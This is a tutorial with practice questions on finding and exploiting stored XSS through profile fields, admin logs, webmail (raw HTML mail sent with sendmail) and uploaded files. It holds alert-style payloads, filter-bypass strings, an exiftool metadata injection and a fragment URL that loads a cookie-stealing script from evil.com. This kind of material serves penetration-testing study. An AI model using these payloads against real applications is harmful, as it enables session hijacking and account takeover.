# 🧠 **Finding and Exploiting Stored XSS Vulnerabilities**

### 🧨 What’s Different About Stored XSS?

Stored (a.k.a. persistent) XSS isn't about reflecting data back immediately — it’s about **planting a payload that gets stored** (e.g., in a database, log, message, or profile field) and then **automatically rendered later** when other users access it.

---

## 🔍 Step-by-Step Breakdown (HACK STEPS)

### ✅ **Step 1: Submit a Unique Identifier Everywhere**

* Insert **a unique test string** (e.g., `xss_test_xyz123`) into **every user input field**: name fields, messages, profile info, etc.
* Later, scour **every page of the app** — including user profiles, dashboards, lists, logs, etc. — for appearances of that string.
* Why? Because **your input might show up in multiple places**, and some might be **insecurely rendered** (without sanitization).

> 🧠 **Tip:** Just because it’s escaped on the profile page doesn’t mean it’s escaped in a message preview or admin view.

---

### ✅ **Step 2: Don’t Forget the Admin Side**

* Check whether **admin-only areas** display user-controlled content.
* **Common example**: If admin dashboards show logs or messages from users, a malicious input like:

  ```html
  <script>alert('XSS')</script>
  ```

  could execute **as soon as an admin logs in** — full account takeover potential.

---

### ✅ **Step 3: Follow Multi-Step Flows**

* Some actions store data **only after a full sequence** of interactions:

  * Registering a user
  * Creating a post
  * Sending a message
  * Completing a payment
* **You can’t just submit the test string** once and stop — **you must complete the workflow** or nothing might get saved.

---

### ✅ **Step 4: Think Outside the Request — Go Out-of-Band**

* Don’t just look at obvious parameters. Consider:

  * **Out-of-band data sources**, like:

    * Email feedback forms
    * Chat systems
    * 3rd-party integrations
    * Webhooks
  * **Indirect input channels**:

    * Logging of IP addresses
    * User-Agent headers
    * Referer headers
    * Error tracking tools
* These might be logged, displayed, or stored somewhere **unsafe**.

---

### ✅ **Step 5: File Uploads Can Be a Trojan Horse**

* If the app allows file uploads (images, PDFs, etc.):

  * Try uploading an HTML file with JS inside and a `.html` or even a spoofed `.jpg` extension.
  * Or upload metadata-laced files (like SVG or PDF) with embedded scripts.
* Later in the chapter, this gets deeper — but for now, just **flag file upload as a top-priority attack surface**.

---

### ✅ **Step 6: Get Creative with Stored Search Terms**

* Some apps display **popular search terms**, recent searches, or autocomplete suggestions.
* If your payload gets saved (e.g., by searching the same string multiple times), it may appear to others.

  For example:

  ```
  Search: <script>alert('Stored XSS')</script>
  ```

---

## 🎯 Once You Identify Injection Points

When you spot your test string showing up on a page:

1. **Test basic script injection:**

   ```html
   <script>alert(1)</script>
   ```
2. If blocked, try:

   * Event handlers (`<img src=x onerror=alert(1)>`)
   * Inline JavaScript (`"><script>alert(1)</script>`)
   * Filter bypasses (will cover later)

> 🔐 **Important**: Stored XSS might bypass CSP headers or JS sanitizers **if the injection point is inside legacy features, PDF viewers, or iframe-based apps**.

---

## 💡 Pro Tip: Use Unique Strings Per Field

If you submit the same test string (`XSS_TEST`) to every parameter:

* You might see it reappear but **not know which field caused it**.

**Better method**:

```text
username=XSS_user123
email=XSS_email456@example.com
bio=XSS_bio789
```

That way, if you later see `XSS_bio789` rendered unsafely on a page, you know exactly which parameter got reflected.

---

## 🧪 Summary

| Attack Vector                         | Stored? | Commonly Forgotten? |
| ------------------------------------- | ------- | ------------------- |
| Profile fields                        | ✅       | ❌                   |
| Admin logs                            | ✅       | ✅                   |
| Uploaded files                        | ✅       | ✅✅                  |
| Search suggestion history             | ✅       | ✅✅✅                 |
| Chat systems / messages               | ✅       | ❌                   |
| System logs (IP, headers)             | ✅       | ✅✅✅                 |
| Out-of-band channels (email, webhook) | ✅       | ✅✅✅✅                |

---

## 🧠 Practice Questions

1. **What is the primary difference between reflected and stored XSS in terms of data flow?**

2. **Why should you test stored XSS all the way through multi-step workflows (like placing an order)?**

3. **How can attacker-controlled User-Agent headers lead to stored XSS? Give an example scenario.**

4. **Why is it important to use unique payloads per parameter during stored XSS testing?**

5. **Name three lesser-known places where stored XSS payloads might appear in a web app.**

---
## Testing XSS on Webmails

### 🔍 Context: Why Focus on Webmail Apps?

Webmail apps are **gold mines** for stored XSS because:

* They **receive HTML content from third parties** (anyone can email you).
* That untrusted content is often **displayed directly** to users — a **perfect injection point**.
* Malicious payloads can be **stored permanently** (in inboxes, logs, drafts) and triggered later when viewed.

> 🧠 Think like an attacker: you’re trying to sneak in malicious HTML or JavaScript into the inbox that executes when viewed — ideally by an admin or another user.

---

## 🧪 Testing Methodology

### ✅ Step 1: Get Access

Obtain a **webmail account** on the target application. This gives you the interface to send and receive emails through the app itself.

* Example: A SaaS business email service like `mail.company.com`.
* Goal: You want to **test payloads inside emails** viewed in the web interface, not a desktop client.

---

### ✅ Step 2: Send Self-Targeted Emails with XSS Payloads

You need to test whether **malicious HTML or JavaScript executes when emails are opened** in the app interface.

**How to do it properly?**

* Send **XSS payloads** to *yourself*.
* Then open those messages *inside the webmail interface*.

> Don’t rely on Gmail, Outlook, etc. They have heavy filtering and content sanitization. You want a **custom or self-hosted webmail app** with minimal sanitization.

---

### ⚠️ Problem: Standard Email Clients Will Sanitize Your Payloads

Most email clients (like Thunderbird, Outlook) will:

* **Auto-fix malformed HTML.**
* **Remove suspicious tags.**
* **Prevent JS execution.**

So you won’t be able to **fully control raw email content**, especially for malformed HTML used in filter bypasses.

---

## 🛠️ Solution: Use Raw Email Injection with `sendmail`

To test *real* XSS vectors, you need to **send raw, unfiltered email content.**

### ✅ Recommended Method: `sendmail` (UNIX-based tool)

#### Step-by-step:

1. Write a raw email in a text file (`email.txt`).
2. Send it using:

   ```bash
   sendmail -t test@example.org < email.txt
   ```

### ✉️ Example Email (`email.txt`)

```txt
MIME-Version: 1.0
From: test@example.org
Content-Type: text/html; charset=us-ascii
Content-Transfer-Encoding: 7bit
Subject: XSS test

<html>
  <body>
    <img src="x" onerror="alert(1)">
  </body>
</html>
```

### 🧠 What’s Happening?

* `Content-Type: text/html`: Ensures that the HTML is rendered, not treated as plain text.
* `<img src="x" onerror="alert(1)">`: Classic XSS vector. The broken image triggers `onerror`.

---

## 🧪 Expand Your Payload Arsenal

Test different payload types:

### ✅ Test:

* Inline `<script>alert(1)</script>`
* Image-based XSS (`<img onerror>`, `<svg onload>`)
* CSS-based (e.g. `style="xss:expression(alert(1))"`)
* Bypass attempts:

  * `<scr<script>ipt>alert(1)</scr</script>ipt>`
  * Obfuscated protocols: `ja&#x09;vascript:alert(1)`
  * Nested tags or malformed HTML
* Charset tricks (`charset=iso-8859-1`, `utf-7`, etc.)
* Alternate Content-Types (e.g., `multipart/mixed`, `text/plain`)

---

## 🛡️ Pro Tip: Why This Matters?

If the application:

* Displays this content **without sanitization**, AND
* **Renders** it using innerHTML or writes it directly to the DOM,

Then your script executes when:

* The user **views** the email in the inbox.
* Or the admin **opens** a specific message (which leads to privilege escalation).

---

## 🧠 Real-World Impact

* XSS in email bodies → **Session hijacking**, **token theft**, **keylogging**, or **phishing overlays**.
* If **admins** open malicious emails → **Stored XSS → Full Admin Takeover**.
* If email rendering happens in **single-page apps (SPAs)** → XSS might lead to **CSRF bypass** or **DOM-based pivoting**.

---

## ✅ Recap: HACK STEPS

| Step | What to Do                                            |
| ---- | ----------------------------------------------------- |
| 1️⃣  | Get a webmail account (test environment)              |
| 2️⃣  | Send HTML/JS payloads to yourself                     |
| 3️⃣  | Avoid standard clients (they sanitize inputs)         |
| 4️⃣  | Use `sendmail` to send raw HTML emails                |
| 5️⃣  | View the messages in the webmail interface            |
| 6️⃣  | Observe behavior: check if payload executes           |
| 7️⃣  | Try different Content-Types, charsets, malformed HTML |

---

## 🧨 Real Payload Example for Stored Webmail XSS

```html
<html>
<body>
  <svg/onload=alert(1)>
</body>
</html>
```

> Malformed but valid in some browsers, and often bypasses bad filters.

---

## 💡 Summary

Stored XSS in webmail apps is **a classic yet powerful attack vector**, especially when:

* Input filtering is lazy or incomplete.
* Stored content is rendered without output encoding.
* Admins or high-privilege users interact with inboxes.

You can leverage this for **internal access**, **pivoting**, and **lateral movement** once stored XSS hits.

---

## Exploit Stored XSS via Uploaded Files

Stored XSS isn’t always about comment boxes or chat messages. Sometimes, the payload **lurks inside uploaded files** — like a ticking time bomb that goes off when someone views or downloads the file.

---

## 🧪 Primary Testing Targets

Apps that allow users to upload files (common scenarios):

* **Webmail:** sending attachments
* **Blog platforms:** uploading featured images
* **Social media:** profile pictures, photo albums
* **File sharing apps:** document collaboration
* **Job portals:** resumes with hidden scripts

---

## 🔍 Vectors That Affect File-Based XSS

| Vector                         | Why it Matters                                                                                    |
| ------------------------------ | ------------------------------------------------------------------------------------------------- |
| **File extension validation**  | Does the app block `.html`, `.svg`, or `.php`? Can you bypass it with `.txt`, `.jpg`, or `.htm1`? |
| **Content-type validation**    | Is it checking the file’s *actual* content or just the MIME type/extension?                       |
| **Content-Disposition header** | If `attachment`, browser prompts download. If `inline`, file renders in browser.                  |
| **Content-Type header**        | Even if set to `image/jpeg`, some browsers may still parse as HTML if contents match.             |

---

## ✅ Basic Exploitation Flow

### Step 1: Upload a Malicious HTML File

Example payload (`xss.html`):

```html
<script>alert('XSS from uploaded file');</script>
```

### Step 2: Download and Render

Visit the file directly via the app:

```
https://target.com/uploads/xss.html
```

* If it **executes**, you've got **stored XSS**.
* If it prompts a download — check headers, content-type, and disposition.

---

## ⚠️ If Blocked: Use Alternate Extensions

Try:

* `.txt`, `.jpg`, `.svg`, `.pdf`, `.docx`, `.zip`, etc.
* Bypass: `file.php.jpg`, `xss.htm.l`, or double extensions like `xss.html%20.txt`

Then check:

* How the app serves the file
* Whether you can render it inline using a direct link

---

## 🧨 Real XSS Case via Broken MIME Sniffing

Even if server returns:

```
Content-Type: image/jpeg
```

… but actual file content is:

```html
<script>alert(1)</script>
```

Old versions of Internet Explorer (and even Firefox/Safari) might **render this as HTML** if:

* You visit the file directly in the browser (not embedded in `<img>` tag)
* The app doesn’t force download with `Content-Disposition: attachment`

---

## 🦠 GIFAR: Hybrid File Attacks

> Exploit: A file that’s *two formats in one*

**GIFAR** = GIF + JAR (Java Archive)
Discovered by Billy Rios

### How It Works:

* GIF format is at the start of the file
* JAR metadata is appended to the end
* Upload it as a **valid GIF** (e.g. profile picture)
* Load it with `<applet>` or `<object>` on another site
* Java plugin executes attacker-controlled code **in the victim’s domain context**

> 🎯 Outcome: If user is logged in, **Java applet gets full session access**

### 🔒 Status: This attack was patched in later Java versions.

But the idea still holds:

> **Hybrid files that are valid in multiple formats** (e.g., image + HTML, image + JS) can bypass filters.

---

## 🕷️ XSS via Image Metadata or Embedded HTML (Advanced Vector)

Modern image formats (like JPEG) have **comment fields**, which can hide scripts.

You can:

1. Embed HTML/JS into those fields
2. Upload the image as a profile picture or shared album
3. Find a rendering mechanism that displays that data using `innerHTML`

---

## 🧬 AJAX-Loaded File Injection (DOM-Based XSS)

Some SPAs (Single Page Applications) use URLs like:

```
https://target.com/#profile
```

What happens:

* Client-side JS fetches `profile` using AJAX
* The response is injected using `.innerHTML` into a live page element

### 🎯 Exploitation Flow:

1. Upload an **image file** containing HTML in metadata (or just a renamed `.html`)
2. Trigger the AJAX route using:

   ```
   https://target.com/#uploads/profile.jpg
   ```
3. If client-side JS fetches it and injects it without sanitization, **XSS fires**

---

## 🧠 BONUS: Remote File Inclusion via Fragment Abuse

HTML5 allows **cross-domain AJAX** (CORS-based), so an attacker can host a malicious file:

```html
<script>stealCookies()</script>
```

And point the app’s AJAX fragment to it:

```
https://target.com/#https://evil.com/xss.html
```

If the app **does not validate that the fetched resource is on the same origin**, boom — **remote XSS**.

---

## 🛠️ Attack Checklist

| ✅ Test Case                                      | ✅ Technique              |
| ------------------------------------------------ | ------------------------ |
| Upload `.html` file with `<script>`              | Stored XSS               |
| Upload `.jpg` containing `<script>`              | MIME sniffing abuse      |
| Upload renamed `.html` → `.txt`, `.jpg`, `.svg`  | Extension-based bypass   |
| Check headers: Content-Type, Content-Disposition | Confirm browser behavior |
| Inject into image metadata (EXIF)                | Hidden payload           |
| Use `#fragment` URLs with AJAX routes            | DOM-based XSS            |
| Try hybrid file formats (GIFAR, etc.)            | Legacy attack chain      |
| Bypass with polyglots                            | SVG, PDF, JSON+JS        |

---

## 🧪 PoC Examples

### 1. Simple `.html` upload

```html
<script>alert(document.domain)</script>
```

### 2. Obfuscated SVG payload

```xml
<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"/>
```

### 3. Image with script in metadata

Use `exiftool`:

```bash
exiftool -comment='<script>alert(1)</script>' xss.jpg
```

---

## 🧠 Summary

* Uploaded file vectors are **overlooked but lethal**.
* Defense is often shallow — limited to extension or MIME type checks.
* AJAX-based apps are **especially vulnerable** due to dynamic rendering.
* Hybrid files and metadata fields provide **creative hiding spots** for payloads.

---